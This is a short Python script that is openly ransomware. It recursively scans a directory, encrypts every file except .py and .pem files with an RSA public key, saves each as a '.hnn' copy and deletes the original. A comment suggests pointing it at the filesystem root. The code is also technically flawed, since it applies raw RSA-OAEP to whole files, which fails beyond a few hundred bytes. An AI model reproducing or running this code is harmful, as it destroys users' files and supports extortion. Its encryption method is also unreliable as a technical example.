#!/usr/bin/env python3

import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from pathlib import Path
import binascii
 
# Read File Directory
def get_file(currentdir):
    '''
    Scanning Files and Directory
    '''
    for file  in os.scandir(currentdir):
        if os.path.isfile(file):
            yield file
        else:
            yield from get_file(file.path)
# Encrypt Data
def encrypt(filepath,key):

    # Conver Filepath into string
    # Before Sting Filepath:- /home/root1/hnn/ransom.py <class ‘pathlib.PosixPath>
    # print(“Before:- “,filepath, type(filepath))
 
    filepath = str(filepath)
   
    # Create New Extension
    new_exe = filepath+'.hnn'
 
    # Read File Data
    with open(filepath,'rb') as f:
        data = f.read()
 
    # Encrypt Data
    encryptor = PKCS1_OAEP.new(key)
    encrypted = encryptor.encrypt(data)
 
    # Save File with New Extenstion
    with open(new_exe,'wb') as f:
        f.write(encrypted)
if __name__ == "__main__":
    with open('public.pem','r') as f:
        pub = f.read()
 
    pub = RSA.import_key(pub)
    #print(“PubKey, type(pub)”)
 
    dir = "/home/root1/hnn" # Change this dir or make it root ‘/’
    my_file = ['.py','.pem']
    for file in get_file(dir):
        filepath = Path(file)
        fileType = filepath.suffix.lower()
        if fileType in my_file:
            continue
        encrypt(filepath,pub)
 
        # Remove Original File
        os.remove(filepath)
